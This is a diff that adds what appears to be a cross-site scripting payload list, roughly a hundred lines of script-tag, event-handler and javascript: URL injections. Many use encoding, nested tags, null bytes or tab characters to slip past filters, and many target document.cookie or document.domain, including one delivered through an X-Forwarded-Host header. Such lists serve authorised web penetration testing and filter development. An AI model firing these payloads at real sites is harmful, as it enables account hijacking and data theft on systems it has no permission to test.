@@ -1,0 +1,103 @@
+<script>{JAVASCRIPT}</script>
+<scr ipt>{JAVASCRIPT}</scr ipt>
+"><script>{JAVASCRIPT}</script>
+"><script>{JAVASCRIPT}</script><"
+'><script>{JAVASCRIPT}</script>
+'><script>{JAVASCRIPT}</script><'
+<SCRIPT>{JAVASCRIPT};</SCRIPT>
+<scri<script>pt>{JAVASCRIPT};</scr</script>ipt>
+<SCRI<script>PT>{JAVASCRIPT};</SCR</script>IPT>
+<scri<scr<script>ipt>pt>{JAVASCRIPT};</scr</sc</script>ript>ipt>
+";{JAVASCRIPT};"
+';{JAVASCRIPT};'
+;{JAVASCRIPT};
+{JAVASCRIPT};
+<SCR%00IPT>{JAVASCRIPT}</SCR%00IPT>
+\";{JAVASCRIPT};//
+<STYLE TYPE="text/javascript">{JAVASCRIPT};</STYLE>
+<<SCRIPT>{JAVASCRIPT}//<</SCRIPT>
+"{EVENTHANDLER}={JAVASCRIPT} 
+<<SCRIPT>{JAVASCRIPT}//<</SCRIPT>
+<img src="1" onerror="{JAVASCRIPT}">
+<img src='1' onerror='{JAVASCRIPT}'
+onerror="{JAVASCRIPT}"
+onerror='{JAVASCRIPT}'
+onload="{JAVASCRIPT}"
+onload='{JAVASCRIPT}'
+<IMG """><SCRIPT>{JAVASCRIPT}</SCRIPT>">
+<IMG '''><SCRIPT>{JAVASCRIPT}</SCRIPT>'>
+"""><SCRIPT>{JAVASCRIPT}
+'''><SCRIPT>{JAVASCRIPT}'
+<IFRAME SRC='f' onerror="{JAVASCRIPT}"></IFRAME>
+<IFRAME SRC='f' onerror='{JAVASCRIPT}'></IFRAME>
+<iframe src=java&Tab;sc&Tab;ript:al&Tab;ert()></iframe>
+<--<img/src=%20onerror=confirm``>%20--!>
+"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+xss%27);}}});alert(document.cookie);$(function+a(){a();});$(function+a(){if(a){}else+if(a){/*///
+<details/open=/Open/href=/data=;+ontoggle="(alert)(document.domain)
+<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
+"<Svg%0COnLoad=alert`1`>"><input type=submit></form>
+ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+\u003e\u003cimg src=1 onerror=alert(0)\u003e
+["');alert('XSS');//"]@xyz.xxx
+<svg%20onx=()%20onload=(confirm)(document.domain)>
+["');alert('XSS');//"]@xyz.xxx
+ ["');alert('XSS');//"]@pavenes.xxx
+<details ontoggle=alert(1337) open>
+<a href="j&#97v&#97script&#x3A;&#97lert(document.cookie)">ClickMe
+<a/href="j&#97v&#97script&#x3A;&#97lert(document.cookie)">ClickMe
+FUZZ%2522%2526%2523x27%253B%253E%253CsVg%252Fonload%253Dconfirm%2528document.cookie%2529%253E
+"></script><script>alert(document.cookie)</script
+<sVg/onLy=1 onLoaD=confirm(1)//
+"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
+<select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
+xss'''><iframe srcdoc='%26it;script>;prompt`${document.domain}`%26it;/script>'>
+/login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
+"><img/src/style=html:url("data:,"><svg/onload=confirm(69)>")>
+"><script>eval(new URL(document.location.href+"#javascript:confirm(69)").hash.slice(1))</script>
+<sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
+<input type="text" value=`` <div/autofocus/onfo<!--esi-->cus='a<!--esi-->lert("XSS")’>X</div>
+<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
+<img/src=x onError="`${x}`;alert(`Ex.Mi`);">
+<iframe/onload=aaajavascipt:alert(1)>
+<svg onload=prompt%26%230000000040document.domain)>
+<x/ onpointerRawupdatE=+\u0061\u006cert&DiacriticalGrave;1&DiacriticalGrave;>Tocuch me!
+<svg onload='new Function`["_Y000!_"].find(al\u0065rt)`'>
+<?tag x="-->" test="<img src=x onerror=alert(1)//">
+≋ "><!'/*"*\'/*\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //># ≋
+%27%3E%3Ca/+/OnMOuSeOvER%0d=%0dconfirm(document.cookie)%3Ev3dm0s
+<script>alert(document.domain</script>
+"><img src=x onerror=alert(document.cookie)>
+javascript:alert(document.domain)
+#data:text/javascript,alert(document.domain)
+?next=javascript:alert(document.domain)
+'onmouseover='alert(document.cookie)'
+input_value');alert(')
+{{$on.constructor('alert(document.cookie)')()}}
+"-alert(1)}//
+<><img src=1 onerror=alert(document.cookie)>
+"><img src="x" onerror="alert(document.cookie)">
+"><img src=x onerror=alert(document.cookie)>
+"><svg onload=alert(document.cookie)>
+"><iframe src=javascript:prompt(document,cookie)>
+"><iframe src=javascript:prompt(1)>
+"><svg onload=alert(1)>
+"><img src=x onerror=alert(1)>
+"><img src="x" onerror="alert(1)">
+"><img src/onerror=prompt(document.cookie)>
+"><!--<img src="--><img src=x onerror=alert(37)//">
+"><img src=a onerror=alert(1)>123@sdf.com
+"><a href=javascript:alert(document.domain);>Click Hare</a>
+"><img src="x" onerror="window.open('https://google.com/');">
+javascript%3Aalert%2F**%2F(document.domain)
+javascript:alert(document.domain)
+"><img src="x" onerror="window.open('https://google.com/');">
+"onmouseover=alert(cookie)//
+"onmouseover=alert(domain)//
+X-Forwarded-Host: bing.com"><img src/onerror=prompt(document.cookie)>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<svg<0x0c>onload=alert(1)><svg>
+<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>
+'onmouseover='alert(document.cookie)'
